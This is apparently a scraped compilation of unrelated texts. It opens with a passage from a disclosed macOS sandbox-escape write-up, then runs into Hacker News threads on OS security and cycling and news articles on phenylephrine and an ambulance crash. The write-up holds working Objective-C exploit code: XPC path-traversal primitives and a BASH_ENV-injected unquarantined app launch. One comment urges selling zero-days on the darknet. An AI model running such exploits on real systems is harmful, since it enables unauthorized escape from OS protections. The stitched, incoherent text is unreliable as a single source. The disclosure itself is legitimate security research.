arbitrary string, that can be controlled by the XPC client. The “powerlog” path can be hijacked to an arbitrary path. The exploit and demo The Exploit 1: Arbitrary Path Delete At line 160 of the function: It calls the method named “archiveDirectoryAt:deleteOriginal:” which will delete the “powerlog” path. So this gives the attacker a primitive to remove an arbitrary path: [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{ @\"taskingAllowlist\":@{}, @\"taskingStartDate\":[NSDate now], @\"taskingEndDate\":[NSDate now], @\"taskingSubmitSP\":@0, @\"taskingTagConfig\":@{ @\"TagUUID\":[NSString stringWithFormat:@\"/../../../../../%@\", path] } } withReply:^(id reply) { NSLog(@\"reply:%@\", reply); }]; The Exploit 2: Arbitrary Directory Create and Full Sandbox Esacpe Moreover, at line 41 of the function “createSignpostFile:”: It creates the directory at the “powerlog” path. So this gives the attacker a primitive to create an arbitrary directory: @protocol XPCSignpostReaderProtocol- (void) submitSignpostDataWithConfig:(id)config withReply:(void (^)(id))arg2; @end void my_create_path(NSString *path) { [[NSBundle bundleWithPath:@\"/System/Library/PrivateFrameworks/PowerlogCore.framework\"]load]; conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.PerfPowerServicesSignpostReader\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCSignpostReaderProtocol)]; [conn resume]; [[conn remoteObjectProxy] submitSignpostDataWithConfig:@{ @“taskingAllowlist\":@{}, @\"taskingStartDate\":[NSDate now], @\"taskingEndDate\":[NSDate now], @“taskingSubmitSP\":@1, @\"taskingTagConfig\":@{ @\"TagUUID\":[NSString stringWithFormat:@\"/../../../../../%@/logarchive\", path], … } } withReply:^(id reply) { NSLog(@\"reply:%@\", reply); }]; } In fact, the primitive to create an arbitrary directory without the quarantine extended attribute can lead to a full sandbox escape. Here, I used the trick from CVE-2023-32364: - (void)viewDidLoad { [super viewDidLoad]; NSString *currentDir = NSHomeDirectory(); NSString *payloadPath = [currentDir stringByAppendingPathComponent:@\"payload\"]; [@\"#!/bin/bashtouch /tmp/sbx\" writeToFile:payloadPath atomically:TRUE encoding:NSUTF8StringEncoding error:nil]; NSString *myapp = [currentDir stringByAppendingPathComponent:@\"poc.app\"]; my_create_path(myapp); // create .app folder without being quarantined mkdir(\"poc.app/Contents\", 0777); mkdir(\"poc.app/Contents/MacOS\", 0777); symlink(\"/bin/bash\", \"poc.app/Contents/MacOS/poc\"); NSString *cmd = [NSString stringWithFormat:@\"defaults write \\\"%@/poc.app/Contents/Info\\\" LSEnvironment -dict-add BASH_ENV \\\"%@\\\"\", currentDir, payloadPath]; system([cmd UTF8String]); system(\"open ./poc.app\"); } Demo link: https://youtu.be/6R4tfOGAjm0 The patch Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the UUID string from the XPC client: If the input string is not a valid UUID, then it will exit the function. Take Away Summary An overlooked attack surface System (private) frameworks’ XPC services (PID Domain) Drop a file/folder without being quarantined == Full Sandbox Escape File quarantine attribute lost during decompression == Gatekeeper Bypass == Sandbox Escape. E.g., CVE-2021-30990 A few sandbox escape vulnerabilities and the exploits And more? There are 5 reports still in the patching queue Find your own sandbox escape vulnerabilities :P One More Thing I submitted this report to Apple: Apple deemed it an expected behavior and closed the report: I can understand why Apple thinks this is an expected behavior. Because the newly launched application is not in the context of the current process and it cannot share entitlements or privileges that the current process may have. My thoughts The App Sandbox: dropped files are quarantined by default. The Service Sandbox: dropped files are not quarantined by default. Not a flaw: The newly launched process is not in the current service execution context, and thus can’t share the entitlements/privileges of the current service. It’s a flaw: Once an attacker get the remote code execution (RCE) in a sandbox-restricted service context (e.g., IMTranscoderAgent, 0-click exploited by NSO Group), he can drop and launch a new non-sandboxed application to get rid of the sandbox restriction of the target service (IMTranscoderAgent). e.g., “com.apple.WebDriver.HTTPService.xpc” calls the API “WBSEnableSandboxStyleFileQuarantine” manually.

On Windows land you have something similar, there is the WinRT sandbox, Win32 app sandbox, secure kernel, driver guard, and a miriad of other stuff, but there are also the cracks of backwards compatibility, specially if you want a single executable able to run across all those configurations.

The right way to do it usually fails the market due to backwards compatibility or developer pushback to adopt such features (see WinRT sandbox).

It only works well for those who are prepared and motivated to learn, and even then, it sometimes can be frustrating. The copy-pasting between VMs, mentioned in a sibling, requires four steps: (1) copying to the source VM's clipboard, (2) copying to the global clipboard, (3) copying to the destination VM's clipboard, and (4) pasting to the destination. The shortcuts become part of your muscle memory after some use, but until they are, that is just one way in which Qubes gets in the way of productivity. There are a bunch of minor quirks, often specific to the hardware, which the user needs to learn about and find workarounds for. But if they do, Qubes is probably the most seamless way to work with tons of (well-isolated) VMs. For example, SecureDrop [0] is based on Qubes and does seem to work well for journalists for securely receiving and working with documents from anonymous sources.

I know where the bodies are buried, so to speak. However, I ultimately gave up looking, because Apple's security vulnerability reporting system is absolute trash; their only interest seems to be to keep you quiet for as long as possible. It's a waste of time. My overall feeling is that macOS has become the victim of security theater, harming both users and legitimate developers with enfeedbled software and an endless stream of permissions requests—much like Apple's old parody of Windows Vista—while doing nothing to stop real attackers, who can easily bypass the security theater whenever they want. reply mike_hearn 3 hours agoparentThe researcher who wrote this article seems to have been able to get a lot of holes patched with credits, albeit, some of these CVEs seem years old. I guess a company wanting as much time as possible to fix bugs is a part of the game though, are other companies really keen for you to announce found vulns ASAP? They don't control how fast people upgrade so announcing slower is always better for end users, and that must ultimately take priority over the need of researchers for publicity. Isn't this something that one has to accept when finding holes in a consumer OS as an external? The Apple sandbox architecture seems well designed to me, usually at least. There seems to have been some breakdown in architecture or communication in this case. To the extent there are bypasses it's because we demand a lot of functionality from desktop operating systems, arguably they are the most sophisticated and complex kind of operating system out there - far more so than server platforms. Web browsers also have a lot of CVEs and it's for the same reason. We want security, but also functionality, and inevitably there's going to be a tension point in the middle where the two rub up against each other. reply lapcat 3 hours agorootparent> The researcher who wrote this article seems to have been able to get a lot of holes patched with credits, albeit, some of these CVEs seem years old. Yes, it requires a lot of time and patience. And I bet that the researcher has more reported vulnerabilities that he can't talk about and aren't fixed.

Apple is notorious for poor communication with security researchers... and with developers, and with everyone else. Apple also tends to patch vulnerabilities more slowly than, say, Google, and Apple frequently stiffs people on the security bounty. reply bzzzt 2 hours agorootparent> Apple frequently stiffs people on the security bounty. Having seen the receiving end of a bounty program of a relatively small SaaS business it's shocking to see how many people are abusing such a program with irrelevant or plain false 'vulnerabilities' and keep begging for a bounty (even when it's clearly stated it's impossible to send money to their countries). I can't imagine how many filters Apple has to employ to just get rid of the noise and get something of value from such a program. reply rustcleaner 7 minutes agoparentprevResponsible disclosure is immediate public disclosure with no embargoes. Embargoes are how we as users are absorbing the costs of poor security practices. If the culture was a no-warning publish culture, I would expect feature iteration and API breaks to slow down to more conservative levels as bikeshedding that stuff dwindles. Punish fast software development iteration with public embarrassment and lost users who got hosed by the vulnerability. If Apple or whoever start dicking around and not paying bounties, release it... or better yet: sell it on the darknet; you have got to be paid for your good work, and NSA/NSO are going to need more 0-day vulnerabilities with WWIII underway! reply CharlesW 3 hours agoparentprev> You can't just add them later, on top of the legacy Mac OS and NeXTSTEP technologies.

Unfortunately? Unfortunately! I beg your pardon. Apple's service revenue is very fortunate for the neverending excuse of security. Want third-party payment processors? It's not that it would upset our revenue stream, it's just too insecure. You want to sideload with the flick of a switch? It's not like we already offer that feature to other users of our products and paying developers, it's not secure enough to attempt. Want an open bootloader for your iPhone like those Apple Silicon Macs? It's not that Apple can't do it, it's just that they claim it's not secure enough. The real kicker? None of us have a privileged enough view of the ecosystem to even know if Apple is right or not. The fact that security has no finish line should be carefully construed as not to excuse companies that move the goalposts of security for petty means.

To the point that for years now, by default, RH boxes are installed in enforcing mode. >> The median Linux system is far behind the median Mac I’m not really interested in the median because for better or worse, Redhat is the most serious game in town for SELinux. Comparing Mac to RHEL, there’s only one place where Mac is ahead and that is a default Mac install at least on Apple silicon will have an immutable root. Redhat has irons in the fire here (rpm ostree can infuturue unlock a user friendly immutable root). Of course you can do immutable root today (and immutable usr and even epehemeral var if you want), but I’m not going to argue those are user friendly.

Also they have far more common use of sandboxing for applications (including the harder bits about selective permissions for apps), code signing, memory protection, pervasive use of HSM and robust layered storage encryption, etc. – all out of the box, whereas even in the much easier case of servers you’re looking at many hours of skilled labor to configure an equivalent.

Compare Android to iOS, which had many more limitations built-in from the start than macOS. Incidentally, this is why iPad has never become the desktop replacement everyone claimed it would be. The hardware is plenty powerful, but it's always been very limited by the software. The greater freedom and capabilities of macOS is a huge advantage for desktop-class functionality. reply hollerith 3 hours agorootparentI think I disagree. If iOS or Android added robust support for external monitors, external keyboards and pointing devices, I'd probably switch to it to get the increased resistance against attacks. If I could continue to run Emacs, e.g., in a VM like WSL2 or Crostini, I'd probably switch right away. If not, it would take me a year or 2 to transition to a replacement before I switch (and, no, that replacement would not need to be able to run software written in Emacs Lisp: I'd be happy to replace, rewrite or walk away from any functionality I currently get from code written in Emacs Lisp). reply 6SixTy 6 minutes agorootparentAndroid does have support for external keyboards and I know mice work but not the totality of pointing devices. There was a desktop experience with Samsung's DeX, complete with floating windows, but the experience was severely broken due to lackluster app support and clashing design priorities between touch and mouse. Thing is that Android is probably no more secure than a standard desktop experience specifically due to the very uncontained Play Store, the prevalence of sideloading apps and rooting doesn't really help at all. nextos 2 hours agorootparentprevI use Linux, I would not switch to Android, but I agree the Linux userland should take sandboxing much more seriously.

However, I do seem to recall vaguely one issue I saw where escaping the sandbox got you a higher privileged state, I think because of a bug in the kernel logic that enforces the sandbox. reply RoxaneFischer1 3 hours agoprevthose overlooked xpc services in the pid domain are a clever way to bypass sandbox limits on macos. that dyld injection trick to dodge entitlement checks is slick. apple’s patching here feels kinda bandaid-y—maybe they need a real overhaul on how sandbox inheritence works? reply Syonyk 2 hours agoprevThis is, unfortunately, the sort of thing that motivates QubesOS. We are, as humans writing code, not good at complexity, and as Apple's lockdown mode admits, parsing complicated stuff, even when you design security boundaries around it, is hard to do properly. Lockdown just punts a ton of complexity entirely out of the system, and the tradeoff is rather substantially improved security against a wide class of attacks. QubesOS design philosophy is essentially, \"Everything in a booted OS image must be assumed to be able to, some way or another, access everything else in there.\" So you have various silos that have extremely limited communication between them (you can \"push\" from one VM to another, but you can never \"pull\" from another VM, the framebuffer is simple, etc). You're totally free to add sandboxing as useful, but it's not considered a full security boundary. Hardware virtualized VMs are, on a fairly stripped down Xen that removes a lot of attack surface in terms of legacy device emulation and other features they don't need. Apple has done a lot of security focused improvements over the years, but modern computers and OSes are just so complicated that even they struggle to get it right regularly. And the attackers only need one mistake to achieve their goals. :( //EDIT: As far as practicality goes, I do daily drive QubesOS as my main computer on a 2C/4T laptop with 16GB RAM - old X250. There are plenty of things it's not great at, but I'm not heavy on the \"videos or video games\" thing anyway. Dual booting for gaming is an option, as is a separate desktop that doesn't do anything important for gaming, but you don't need some monster machine to do practical things with Qubes. I can't have a thousand browser tabs open, but I don't do that anyway, I browse \"JITless\" (disable Javascript JIT as it's a ton of attack surface that's regularly exploited), and... it's a less-intense form of computer use than standard, but it also means I don't have a desire to spend all my time on a computer. reply normie3000 1 hour agoparentInteresting set up, thanks for sharing. Do you write code, or use docker at all? reply Syonyk 1 hour agorootparentI write code, yes. I'll just spin up a development VM as needed, things work fine. I don't use Docker, but as long as you're not using the hardware virtualized modes, it should work just fine on namespaces. Every VM is running a full featured Linux kernel. There's just not nested virtualization support, which I'm totally fine with, because nested virtualization on x86 is a rather complex mess to get right. The main thing you lose is GPU acceleration.

If I could get all of my friends to switch to one communication app, that would be great, but that's only going to happen if they can get their friends to switch, and so on. Unfortunately, doing so requires them to install additional apps for communication, and no one can get everyone they talk to to switch, so they're just going to have more people on one app than another and in the end the problem gets worse. reply Syonyk 2 hours agorootparentMatrix bridges solve a lot of this problem, though... aren't really reducing complexity at all ends of the system. It does radically reduce end user app complexity, though. I've been hosting a Matrix homeserver for... oh, 4-5 years, now, and I have bridges installed for my use and a few other people who use it that bridge Signal, Google Chat, Facebook Messenger, and maybe one or two other services into Matrix - so I almost never have to bother with the other clients, I just use a Matrix client everywhere. There are the occasional quirks you have to deal with, most of which are solved by upgrading your bridge (and the new bridges are a lot easier to deal with than the older ones). As people decide to go Matrix-native, I can talk to them that way as well. That said, as far as non-Matrix options go, Signal seems to be a fairly common one and easy enough to get people to switch to. reply knotimpressed 2 hours agorootparentJust heard of Matrix and it seems super interesting; how clunky are the bridges in practice? Is the UX/setup painless or does it have some issues? reply Syonyk 1 hour agorootparentI mean, how's your Linux command line these days? https://docs.mau.fi/bridges/go/setup.html?bridge=signal is the setup for the Signal bridge, and you'll also need to look at the initial config setup. Once you have a working Matrix homeserver, it's mostly \"Create a new database table, point the bridge at it, add the proper incantations to your homeserver config so it knows the bridge is permitted, and start things up.\" I don't find it bad in the slightest, but I'm also a legacy Linux sysadmin sort. There are also Docker methods of doing it, if you prefer that: https://docs.mau.fi/bridges/general/docker-setup.html?bridge... If you're a GUI-only sort, it will be painful. If you're competent with older styles of Linux sysadmin, it's fairly straightforward, though getting Matrix federation working reliably can be a slight pain.

Credit: GettyPATRICK T. FALLON Text settings In a long-sought move, the Food and Drug Administration on Thursday formally began the process of abandoning oral doses of a common over-the-counter decongestant, which the agency concluded last year is not effective at relieving stuffy noses. Specifically, the FDA issued a proposed order to remove oral phenylephrine from the list of drugs that drugmakers can include in over-the-counter products—also known as the OTC monograph. Once removed, drug makers will no longer be able to include phenylephrine in products for the temporary relief of nasal congestion. \"It is the FDA’s role to ensure that drugs are safe and effective,\" Patrizia Cavazzoni, director of the FDA’s Center for Drug Evaluation and Research, said in a statement. \"Based on our review of available data and consistent with the advice of the advisory committee, we are taking this next step in the process to propose removing oral phenylephrine because it is not effective as a nasal decongestant.\" For now, the order is just a proposal. The FDA will open up a public comment period, and if no comments can sway the FDA's previous conclusion that the drug is useless, the agency will make the order final. Drugmakers will get a grace period to reformulate their products. Reviewed reviews The slow-moving abandonment of phenylephrine is years in the making. The decongestant was originally approved by the FDA back in 1976, but it came to prominence after 2006. That was the year when the \"Combat Methamphetamine Epidemic Act of 2005\" came into effect, and pseudoephedrine—the main component of Sudafed—moved behind the pharmacy counter to keep it from being used to make methamphetamine. With pseudoephedrine out of easy reach at drugstores, phenylephrine became the leading over-the-counter decongestant. And researchers had questions. In 2007, an FDA panel reevaluated the drug, which allegedly works by shrinking blood vessels in the nasal passage, opening up the airway. While the panel upheld the drug's approval, it concluded that more studies were needed for a full assessment. After that, three large, carefully designed studies were conducted—two by Merck for the treatment of seasonal allergies and one by Johnson & Johnson for the treatment of the common cold. All three found no significant difference between phenylephrine and a placebo. Last year, the FDA reevaluated the drug again, taking into consideration the new studies and taking a deeper look at the 14 studies from the 1950s to 1970s that earned phenylephrine its initial approval. The FDA noted that those 14 studies assessed congestion using a dubious measure of nasal airway resistance that has since been abandoned. But even with the shoddy measurement, the studies provided mixed efficacy results. And the overall finding of efficacy hinged on only two of the studies, which were conducted at the same lab. Too good to be real No other lab was ever able to replicate the positive results from those two studies. And when FDA scientists carefully looked through the data, they found evidence that some of the numbers could have been fudged and that the results were \"too good to be real.\" As a final nail in phenylephrine's coffin, modern studies suggest that when phenylephrine is taken orally, it's highly metabolized in the gut, leaving less than 1 percent of the consumed dose as active in the body. The finding explains why oral doses don't cause the constriction of blood vessels throughout the body that could lead to an uptick in blood pressure—a side effect sometimes seen with pseudoephedrine. While researchers initially thought the lack of blood pressure increases was a positive finding, in retrospect, it was a hint that the drug wasn't working. With that, a panel of advisers for the FDA voted unanimously, 16 to 0, that oral doses of phenylephrine are not effective at treating a stuffy nose. Afterward, CVS announced that it would remove products that had phenylephrine as the sole active ingredient. Despite the seemingly damning evidence, the industry group representing makers of phenylephrine-containing products—the Consumer Healthcare Products Association (CHPA)—still disputed the FDA's move. “CHPA is disappointed in FDA’s proposal to reverse its long-established view of oral PE [phenylephrine],\" CHPA CEO Scott Melville said in a statement Thursday. CHPA maintains its position on the drug's efficacy. \"As science and methods advance, new data should be considered in the context of the full weight of available evidence, not as a complete replacement of the previous body of evidence—especially when considering an ingredient as safely and widely used as PE. CHPA will review the Proposed Order and submit comments accordingly,\" Melville said. Beth Mole Senior Health Reporter Beth Mole Senior Health Reporter Beth is Ars Technica’s Senior Health Reporter.

    "originBody": "A photograph in a Rainier Police Department report shows William Hoesch's bicycle under the wheel of a Columbia River Fire & Rescue ambulance in October 2022.Rainier Police Department By Aimee GreenThe Oregonian/OregonLive An Oregon cyclist who was struck by an ambulance that made a right turn into him — fracturing his nose and leaving him with scrapes and other injuries across his body — has filed a $997,000 lawsuit against the ambulance provider after it scooped him up, drove him to the hospital and then billed him for the service, according to the suit. Attorney Travis Mayor says the ambulance provider — Columbia River Fire & Rescue — sent his client, 71-year-old William Hoesch, a $1,862 bill for the ambulance ride. That’s among about $47,000 in medical expenses that Hoesch has racked up so far and another $50,000 of medical costs he expects in the future, the suit states. Columbia River Fire & Rescue declined to comment. Allstate Fire and Casualty Insurance Co. didn’t respond to a request for comment. The suit claims that Hoesch’s uninsured or underinsured motorist coverage is obligated to cover any damages that Columbia River Fire & Rescue is unable to. According to the lawsuit, Hoesch was pedaling through the small town of Rainier in Columbia County in October 2022 when he and the ambulance were traveling the same direction on a street that’s a mix of homes and businesses. The ambulance attempted to make a right turn onto another street, crashing into Hoesch and destroying his bicycle, according to the suit, which was filed Oct. 24. William Hoesch is pictured here after he and an ambulance collided while he was riding his bicycle in October 2022.Submitted photo The crash happened in front of Columbia River Fire & Rescue’s Rainier station, as the ambulance was returning from a trip. According to police reports, the driver who struck Hoesch and a passenger in the ambulance estimated the ambulance was going between 2 mph and 10 mph when they heard a thump, stopped and saw Hoesch injured. Hoesch estimated to police that he was going 5 mph to 10 mph and said he didn’t think the ambulance was going to turn in front of him. His bicycle was crushed under the ambulance wheel. Hoesch’s lawsuit also seeks $900,000 for pain and suffering, stating he suffered decreased range of motion, reduced grip strength and other symptoms. A Rainier Police Department report included this photo of the crash scene involving William Hoesch and a Columbia River Fire & Rescue ambulance.Rainier Police Department Ambulance crashes involving cars, cyclists or pedestrians are rare but not unheard of in Oregon. Last month, the estate of 25-year-old Kelsey Seibel filed a $6 million lawsuit against South Lincoln Ambulance and Yachats Rural Fire Protection District, stating that one of their ambulances made a left turn in front of Seibel’s car on U.S. 101, killing Seibel in January 2024. And on July 18 at 1 a.m., Oregon State Police say an AMR ambulance hit a car with a flat tire parked on the side of Interstate 84 in Hood River County, killing 55-year-old Geraldean Martin, who was standing outside her car. No lawsuit has been filed in that case. — Aimee Green covers breaking news and the justice system. Reach her at 503-294-5119, agreen@oregonian.com or @o_aimee.

Riding a bicycle does pretty much the same thing, even though the evasive maneuvers take a different form. Motorcycles probably train some instincts that are more relevant to driving a car, though, given the speeds involved. Also, motorcycles train people better because they apply more selection pressure: there are plenty of inattentive bicyclists, and most of them are still aboveground. The inattentive motorcyclists, on the other hand, aren't around anymore to drive cars. reply tabbytown 10 hours agorootparentprev> (Possibly controversial belief: riding a motorcycle makes you a better car driver. Motorcycling has made me pick up habits like always looking over my shoulder and not solely trusting my mirrors when changing lanes) Completely agree: 1. Finding the gaps in traffic, and hanging out there and chilling. Cars always cluster together. If I crash when I'm in a gap, it's my own fault. But I'm not going to crash because someone veers into my lane while watching Youtube. (Benefit of motorcycling where lane splitting is allowed: the gap may be ahead, as well as behind. Plus it feels really good to get in front of everyone else when they're all jockeying together to get ahead.) 2. Following distance. Why does everyone follow one car length behind? This is basic driver's ed. If I'm further back I've got time to dodge obstacles, account for slowdowns and react to crashes ahead. This is closely related to #1. 3. Using my turn signals, religiously. I turn them on well before a lane change or turn. 4. Memorizing my route, to avoid distractions. When motorcycling, I don't want my phone out. I need to be caffeinated, laser focused, and geared up for battle. 5. Being comfortable going slow.

This always seemed like a weird trade off to me - “you are inconveniencing some pedestrians, so go in this other lane where you can die” I grew up in Eastern Europe, where technically the laws are similar, but no policeman is going to stop you for riding on the sidewalk. So you naturally mix with pedestrians - that means you travel slower but a lot safer. I remember going to Barcelona ~ 10 years ago and renting some bicycles to explore the city. I knew that this would be a different experience since the laws are different, but my partner at the time just didn’t care to follow local laws, so she just went on and started going on the sidewalks. The locals were _very_ strict in directing you off of them, no police got involved but I could see that happening if you tried to do that more. Now I went there last year, and it was like the locals have “lost the war” on that - maybe because the city has built enough bike lanes that the few places where you _had_ to go on a sidewalk you weren’t that much of a nuisance or because the sidewalks themselves got bigger or something else, but the experience was a lot more pleasant than anywhere else I’ve cycled. Bicycles should _not_ mix with cars in my opinion - let those travel at high speeds, just make mixing of pedestrians and bicycles regulated and safe and all would be well. reply SauciestGNU 4 hours agorootparentI'm very much an \"old school\" commuter cyclist, I started way before this current movement towards vision zero and separated bike infrastructure, to provide context. Bicycling is my main transport and has been for 15 years now. I practice \"vehicular cycling\" and love being in the road. I also choose routes where I can maintain at least 75% of the speed limit, so lots of 30mph roads. It's definitely sketchier than the new style infrastructure that's popping up, but it's also way faster. I use a radar and mirror for safety and I keep the speed delta between traffic and myself at a minimum. Only serious injury I've had was getting creamed by an incoming drunk driver at speed. Best world would be keeping pedestrians, cyclists, and cars all separated for maximum convenience. But failing that, I'd much rather be in a painted bike lane than on a sidewalk. reply Retric 13 hours agorootparentprevMixing pedestrians with bikes runs into its own set of issues, at high enough density bikes simply can’t be ridden. Really there’s no one solution that works at every scale. Bikes on sidewalks are also far less safe in deaths per mile than it seems. reply stavros 10 hours agorootparentI live in Thessaloniki, where you can get pretty lucky: The city is built along the coast, so there's a large boardwalk spanning the entire coast, it's pretty broad and has a nice bike lane. You can cycle from one side of the city to the other in 20 minutes or so, and the boardwalk is so broad that pedestrians tend to have enough space to stay out of the bike lane. It's an extremely pleasant way of transportation.

But that typically doesn't work for sidewalks in many cases because they're either too narrow or have too much foot or bike traffic.

And safe passing in WA is three feet. From WSDOT: > Pass at a safe distance. Leaving an extra safety buffer in time and space when passing people gives you more ability to see and react, and it’s also the law. Be aware that a bicyclist needs to be positioned in the lane a safe distance away from opening car doors, grates, and other hazards not visible to a driver.

Then I think you've never met a cyclist. As in actually riding a lot, not as in owning a bike and having occasionally achieved the balancing act. I know enough cyclists to hear about someone getting hit by a car multiple times a year and a large majority of those cases are getting hit in intersections (and in interactions with driveways) while traveling on \"separated\" bike infrastructure. Because the reality is that it's never really separated, intersections do exist. That \"separated\" infrastructure? It's merely out of sight out of mind for the drivers. Which would be an effective strategy if your goal was to maximize accidents. Those people who keep getting hit on separate bike lanes? They already make bike lane avoidance a factor in their route selection and yet still most of their hits happen on the small subset of their miles that are on \"separated\" infrastructure, not on the many, many miles done in the lane. Yes, some separated bike infrastructure feels nice to use. And a subset of that even happens to not be inherently dangerous. But that's only where that is easy to do. Yes, on an high traffic road that is so close to limited access design that it's always miles per instead of intersections per mile, yes, a well-built bike lane is nice. Even when it's separated. But those that keep cruising side streets, driveways and the like? They are dangerous thrill courses hated by all cyclists but a tiny minority. The tiny minority that sees themselves more like pedestrians who happen to sit while while almost walking than like actual cyclists. And yes, I know the Netherlands exist. Safety in numbers can move the threshold and the exact same bike infrastructure that would be a bone-crushing through thrill course under little use can become quite tolerable when it's used so much that \"out of mind\" can never happen.

The trails are filled with baby strollers and inline skaters moving in and out of lanes. typically there is no right of way when crossing roads or entrances to parking lots. Blind corners with overgrown vegetation are par for the course. Riding in traffic is an absolute pleasure when you know how to draft vehicles. The suction created by larger box trucks can actually pull you along with minimal effort. Dedicated bicycle lanes on existing roads are the worst. You are trapped in an area where turning vehicles are going to T-bone you. Pedestrians will tentatively step out on the the asphalt as they ponder crossing the street. Want to swerve around them? Good luck, there are bollards or other barriers now separating the cycling lane from the rest of the larger roadway. This is why there is a common international driving etiquette to not overtake on the outer lane. Yet, safety maxi city planners, who clearly never pursued cycling at any level, insist upon building dedicated cyclist lanes on the outside. I see many accidents posted as outrage bait on Twitter caused by cyclists attempting to overtake on the outside or being overtaken by cars attempting to turn. As a professional courier, I would have never attempted such maneuvers. Overtake on the inside, like any other vehicle. Stay behind the brake light on the inside bumper. Be prepared to weave to the inside if the vehicle slows. If you are not keeping pace with traffic, yield to the outside and do not make a pest of yourself. Unless of course there is an immediate intersection, then you should defend against a turning vehicle. Dedicated cycling lanes have issues and bike trails often do not go to the destinations you need. It is a nice alternative for leisurely cycling, but not applicable utilitarian transportation. I often wonder if the planners of these things have ever used a bicycle to pick up groceries or run errands. Finally, all of the people crying about how dangerous cycling is, will most likely still complain or find other excuses to not ride their bike. That's fine. I'm not here to convert everyone into a cyclist. Personally, I have no issues sharing the road with cement trucks. \"I would start riding my bike to work, if only you built me...\", becomes, \"It is too hot, cold or rainy to ride bikes\" or, \"I can't carry groceries on a bicycle, are you crazy?\". It is much like the chronically overweight or those who claim they want to quit smoking. These people don't actually want to ride bikes. That's fine, but we shouldn't attempt to accommodate their excuses by wasting money building infrastructure which creates dangerous expectations for motorists and cyclists. Stated preferences are not always what users want or need. reply scott_w 12 hours agorootparentI think you need to cycle in a country with good infrastructure and laws that protect cyclists. Most countries’ “cycling infrastructure” is a pathetic joke. reply giancarlostoro 15 hours agorootparentprevYeah? Except where I live, we have \"bike trails\" wide enough, and newly paved looking enough that I could drive my car over them, in fact! The lawncare people for my neighborhood absolutely drive their trucks on them, with enough room to let people pass them by! And yet, I still see people on the regular roads, at the worst times: early morning when most people are trying to get to work, or right as the sun is going down when it is drastically harder to notice a bicycle. One time I was going up a hill I've been up and down a million times, only to be shocked to find, after sundown, similar road with a BIKE TRAIL, some person riding their bicycle WITH NO LIGHTS, on a road where you're expected to go 45 (its actually 55 when I googled it!) or more, giving me little time to react, I have NEVER seen someone be so careless on this road, or even ride a bicycle on it, because its not a road for bicycles. So no, it's not just the cars that are dangerous, its the carelessness of bicycle riders that is equally dangerous. reply AlotOfReading 14 hours agorootparentTo preface, I don't know anything about your specific area, but bike infrastructure is like car infra in that there are multiple classes of infrastructure for different purposes. What are commonly called bike trails tend to be off-road paths that go on meandering paths through nice parts of the city like parks and vineyards. That's not what my post is talking about. People going to work typically take the most direct route there, which is usually the same road cars take rather than those trails. Thus you see people cycling on the same busy roads you're rushing to work on. That's an urban planning problem and one that I've spent lots of time trying to fix in my own community. In every case it's been held up by people who don't want to spend money on bikes and in one memorable case were worried about a traffic study that estimated an additional 30s worst case scenario for commute length increases. As for the hill thing, cyclists are not obligated to have rear facing lights in any state I'm aware of, only forward facing. They need to have a rear retroreflector for visibility in most places. These come on all bikes by default and the only way to not have them is to intentionally remove them, which is uncommon. I assume they didn't since you didn't mention it, and I'm also going to assume the road doesn't have a bike lane since you mentioned a bike trail on some similar path instead. In that case, they're probably allowed to be there (though they should have forward facing lights and safety patches for their own sake). Your responsibility as a driver is to drive at speed where you can identify and safely react to obstacles, including bikes. It sounds like that didn't happen here, but you're blaming someone else for the near miss. reply giancarlostoro 13 hours agorootparent> As for the hill thing, cyclists are not obligated to have rear facing lights in any state I'm aware of In Florida, my state, they absolutely must: - A bicycle operated between sunset and sunrise must be equipped with a lamp on the from exhibiting a white light visible from 500 feet to the front and both a red reflector and a lamp on the rear exhibiting a red light visible from 600 feet to the rear. - A bicyclist who is not traveling at the same speed as other traffic must ride in the designated bike lane or as close as practicable to the right-hand curb or edge of the roadway. See here: https://www.flhsmv.gov/safety-center/driving-safety/bicycle-...

That said, can you give specific examples of what you mean by \"make car infrastructure worse\"? Usually segregation is just a matter of putting a barrier on an existing bike lane and painting lines, which doesn't actually change anything for drivers who stay in the lines. In some cases, a lane may be converted, but this rarely impacts travel times much for the same reasons adding additional lanes doesn't improve travel times.

Often, the same person does both (at different times)! reply consteval 3 hours agorootparent> Why would Homo sapiens on bicycles be any less prone to error or negligence or aggression than those in automobiles? For a few very obvious reasons: 1. Cars have significantly less visibility. Often cars run into other cars at speed without having ever even seen them. Now imagine bicycles. 2. Cars are much faster, so mistakes are amplified. Often with cars you're forced to commit to bad decisions because you're simply too fast to abort. 3.

The Waymo arrives (from the South) and stops at the stop line. 5. The Waymo waits at the stop line because, if it were to proceed, its path would intersect with the turning lorry's path. 6.

And the law (here in Sweden) says I should drive no faster than that I can stop on the road surface I can see.

If their driving under influence causes the slightest injury to other people they should receive a substantial jail sentence, and should their driving cause death they ought to receive at least a first-degree manslaughter charge.

We’re looking decades into the future when manually piloting a car is a privilege. (Or less than a decade in cities with public transit.) If you’re driving drunk, hitting things, recklessly speeding or texting while driving, you shouldn’t be driving. We tolerate it, extraordinarily, because driving is almost a right in America. What’s changing is it’s going from a necessity everywhere but New York to a necessity where there isn’t Uber.

The risk of hit-and-run accidents, uninsured drivers, and unlicensed drivers on the road are increasing. While public transit could be a great solution, much of the poorest in the US cannot afford to live in places with good public transport because these areas have higher housing costs. > We tolerate it, extraordinarily, because driving is almost a right in America. Partially. But even the laws we do have are currently being ignored, because rates of compliance are so low that it isn't even practically feasible to enforce the law. In several US states, more than 20% of drivers are driving around without insurance. The underlying problem here is beyond what can be solved merely with enforcement. I'm hopeful it eventually happens, but I think we're a very long way from a world where someone in small-town Mississippi can ride around in a robotic car on a McDonalds wage. reply Dylan16807 16 hours agorootparentprev> Calling (or buying) a robotic car.

But when people make irresponsible decisions that result in third parties being killed, this is when we make laws and ban things. This is why, for example, there is a ban on intoxicated driving. Not because of the risk of harm to the drunk driver, but because of the risk to everybody else, who want to stop volunteering to share roads with drunk drivers. reply itsumoiru 18 hours agoparentprevI think most people equate \"bicycles are dangerous\" with \"cycling is dangerous\", which seems perfectly reasonable to me.

Cycling isn't dangerous, being on the street with cars is dangerous. Being on the street on a bike is dangerous, walking down a street is dangerous.

It's important to be precise about the source of the danger because it correctly identifies the problem. There's a big push right now to ban people from buying and registering Kei cars with the argument being that they're too dangerous on american roads.

